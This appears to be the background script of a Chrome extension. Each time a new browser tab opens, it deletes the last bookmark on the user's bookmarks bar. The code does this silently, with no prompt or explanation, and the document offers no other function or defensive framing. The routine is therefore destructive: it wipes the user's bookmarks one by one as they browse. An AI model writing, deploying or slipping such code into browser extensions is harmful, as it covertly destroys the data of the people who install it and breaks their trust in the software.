$(document).ready(function() {
  onCreatedChrome();
});

function onCreatedChrome() {
  chrome.tabs.onCreated.addListener(function(tab) {
    chrome.bookmarks.getChildren("1", (bar) => {
      chrome.bookmarks.remove(bar[bar.length - 1].id);
      });
  });
}
